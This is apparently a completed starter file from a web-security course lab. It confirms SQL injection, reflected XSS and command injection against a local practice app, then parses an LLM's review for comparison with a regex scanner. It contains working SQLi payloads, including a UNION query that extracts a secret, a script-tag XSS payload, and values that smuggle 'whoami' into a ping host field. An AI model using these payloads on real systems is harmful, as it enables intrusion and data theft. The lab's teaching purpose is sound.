"""Week 6 studio — starter (web injection + the LLM-vs-scanner duel).

Fill in the functions below, then run ``python3 test_studio.py``. All provided
tests must pass, INCLUDING the guarantee test that watches the classical scanner
MISS the SQLi and neither arm cleanly find Broken Access Control — because the
vulnerability class automated tools are worst at is exactly OWASP-2021 #1, and a
lesson you can watch fail as a test is one you actually understood.

The one idea (from Session 6A): every injection is the same bug — untrusted data
crosses into a control channel (SQL / HTML / a shell). And the discipline (axis 3):
a finding is NOT real until a SOUND ORACLE confirms a security-relevant effect. A
reflected string is not XSS; a canary leak IS SQLi.

Everything runs laptop-only against 127.0.0.1 (webharness brings the app up
in-process — no Docker). Nothing here touches a network you were not authorized
to test; see ../../resources/ethics-and-scope.md.
"""

from __future__ import annotations

import json
import re

from webharness import (login_send, reflect_send, reflect_safe_send, ping_send,
                        RULE_ALIASES)
from seclab.attack import Payload, Finding, run_payloads, contains_oracle
from seclab.scan import ScanResult


# ============================================================================
# TASK 1 — three oracle-confirmed findings against the running vuln-web app
# ============================================================================
# For each sink: build the payload(s), wire them through seclab.attack with a
# SOUND oracle, and return the Findings. Include a benign control (family="benign")
# so you can prove your oracle does NOT fire on legitimate input — a false positive
# in your tooling poisons every number in your report.

def confirm_sqli() -> list[Finding]:
    """SQL injection at /login. Confirm by EXTRACTING DATA, not by "the page looked
    different": leak the admin canary ``FLAG-sqli-...``.

    Build payloads in the USERNAME field (password is a throwaway):
      - an auth-bypass, e.g.  admin' OR '1'='1
      - a comment-out,  e.g.  admin'--
      - a UNION dump that pulls the secret column (the strongest proof)
      - a benign control: family="benign", a real user + the wrong password
    Then run them with ``run_payloads(payloads, send=login_send, oracle=...)``.
    Use ``contains_oracle("FLAG-sqli-")`` — it confirms only if the canary comes
    back (an exfiltrated row), NOT if the payload is merely echoed.

    Return the list of Findings.
    """
    payloads = [
        Payload("admin' OR '1'='1", intent="auth bypass", family="sqli"),
        Payload("admin'--", intent="comment out password check", family="sqli"),
        Payload("admin' AND 1=0 UNION SELECT user, secret FROM users WHERE user='admin'--",
                intent="extract admin row with UNION", family="sqli"),
        Payload("admin", intent="real user with wrong password", family="benign"),
    ]
    return run_payloads(payloads, send=login_send,
                        oracle=contains_oracle("FLAG-sqli-"), trials=3)


def confirm_xss() -> tuple[Finding, Finding]:
    """Reflected XSS at ``/?name=`` — and the true negative at ``/safe?name=``.

    The oracle is the crux of the week: a reflected string is only XSS if it would
    EXECUTE. You can't run a browser here, so the sound necessary condition is that
    the ``<script>`` survives UNescaped in the response (an un-encoded ``<script>``,
    NOT ``&lt;script&gt;``). Merely coming back in the body is reflection, not XSS.

    Fire the SAME payload at both endpoints and return ``(vuln_finding,
    safe_finding)``. The vulnerable ``/`` must confirm; the fixed ``/safe``
    (html.escape) must NOT — that is the true negative you carry into the duel.

    Write your own oracle ``xss_oracle(payload, response) -> (bool, str)``; do not
    reuse ``contains_oracle`` here (the payload IS the marker, so it would confirm
    mere reflection — the exact false positive this task is about).
    """
    def xss_oracle(payload: Payload, response: str) -> tuple[bool, str]:
        # In this known HTML text context, require an actual script element with
        # our marker. An encoded reflection cannot satisfy this condition.
        script = re.search(r"<script\b[^>]*>[^<]*XSS-FIRED-7f3a[^<]*</script\s*>",
                           response, flags=re.IGNORECASE)
        hit = bool(script and payload.text in response)
        return hit, "unescaped script element in HTML response" if hit else ""

    payload = Payload("<script>alert('XSS-FIRED-7f3a')</script>",
                      intent="test reflected script element", family="xss")
    vulnerable = run_payloads([payload], send=reflect_send,
                              oracle=xss_oracle, trials=3)[0]
    safe = run_payloads([payload], send=reflect_safe_send,
                        oracle=xss_oracle, trials=3)[0]
    return vulnerable, safe


def confirm_cmdi() -> list[Finding]:
    """Command injection at /ping. A shell metacharacter (``;`` ``&&`` ``|`` ...)
    smuggles a second command past ``ping -c 1 <host>``. The lab SIMULATES
    execution (it reports ``injection_detected``) so it is safe to run, but the bug
    — untrusted data reaching a command context — is real and confirmable.

    Sound oracle: parse the JSON response and confirm on ``injection_detected is
    True`` (a metacharacter reached the command), NOT on the string being echoed.
    Include a benign control (a plain host with no metacharacters) that must NOT
    confirm. Return the Findings.
    """
    def cmdi_oracle(payload: Payload, response: str) -> tuple[bool, str]:
        hit = json.loads(response).get("injection_detected") is True
        return hit, "shell metacharacter reached command context" if hit else ""

    payloads = [
        Payload("127.0.0.1; whoami", intent="semicolon separator", family="cmdi"),
        Payload("127.0.0.1 && whoami", intent="conditional separator", family="cmdi"),
        Payload("127.0.0.1", intent="plain host", family="benign"),
    ]
    return run_payloads(payloads, send=ping_send, oracle=cmdi_oracle, trials=3)


# ============================================================================
# TASK 2 — the duel: parse the LLM arm's output into ScanResults
# ============================================================================
# The CLASSICAL arm (webharness.regex_scanner) and the GROUND TRUTH
# (webharness.load_ground_truth, reused from the Duel-2 fixture) are GIVEN. Your
# job is the LLM arm: turn a model's free-text review into structured ScanResults
# so seclab.scan can score it the same way as the scanner. In the studio the raw
# text comes from seclab.LLM; here (and in the tests) it is webharness.RAW_LLM_REVIEW.

def parse_llm_review(raw: str) -> list[ScanResult]:
    """Parse a model's free-text vulnerability review into ScanResults.

    Each finding line looks like:
        "1. [HIGH] SQL Injection in do_login: ..."
    Extract, for each line that names a vulnerability at a location:
      - the RULE: map the prose name to a canonical rule via ``RULE_ALIASES``
        (e.g. "SQL Injection" -> "sqli", "Broken Access Control" ->
        "broken-access-control").
      - the LOCATION: the ``do_<name>`` function it points at (regex ``do_\\w+``).
      - severity/confidence if present (optional; the key() ignores them).

    Return one ``ScanResult(rule=..., location=..., tool="llm", ...)`` per finding.
    Do NOT filter out the suspicious ones — parse the model faithfully, including
    its Broken-Access-Control claim and its finding on ``do_reflect_safe``. Whether
    those are real is decided by scoring against the ground truth, not by you.
    """
    findings = []
    aliases = sorted(RULE_ALIASES.items(), key=lambda item: len(item[0]), reverse=True)
    for line in raw.splitlines():
        location = re.search(r"\bdo_\w+\b", line, flags=re.IGNORECASE)
        if not location:
            continue
        rule = next((canonical for name, canonical in aliases
                     if re.search(rf"\b{re.escape(name)}\b", line,
                                  flags=re.IGNORECASE)), None)
        if not rule:
            continue
        severity = re.search(r"\[(critical|high|medium|low|info)\]", line,
                             flags=re.IGNORECASE)
        findings.append(ScanResult(
            rule=rule, location=location.group().lower(), tool="llm",
            severity=severity.group(1).lower() if severity else "unknown",
            raw=line.strip()))
    return findings


# ============================================================================
# Task 3 (Control Scorecard + disclosure note) is prose — see README.md.
# ============================================================================


if __name__ == "__main__":
    from seclab.attack import print_summary
    from seclab.scan import compare_scanners, print_comparison
    from webharness import regex_scanner, RAW_LLM_REVIEW, SOURCE, load_ground_truth

    for name, fn in [("SQLi", confirm_sqli), ("cmdi", confirm_cmdi)]:
        try:
            print(f"\n== {name} ==")
            print_summary(fn())
        except NotImplementedError:
            print(f"  {name}: not implemented yet")

    try:
        vuln_f, safe_f = confirm_xss()
        print("\n== XSS ==")
        print("  vulnerable / :", "CONFIRMED" if vuln_f.confirmed else "no effect")
        print("  fixed /safe  :", "CONFIRMED" if safe_f.confirmed else "no effect",
              "(true negative)")
    except NotImplementedError:
        print("\n  XSS: not implemented yet")

    try:
        llm = parse_llm_review(RAW_LLM_REVIEW)
        print("\n== Duel ==")
        print_comparison(compare_scanners(
            {"regex-scanner": regex_scanner(SOURCE), "llm": llm},
            load_ground_truth()))
    except NotImplementedError:
        print("\n  Duel: parse_llm_review not implemented yet")
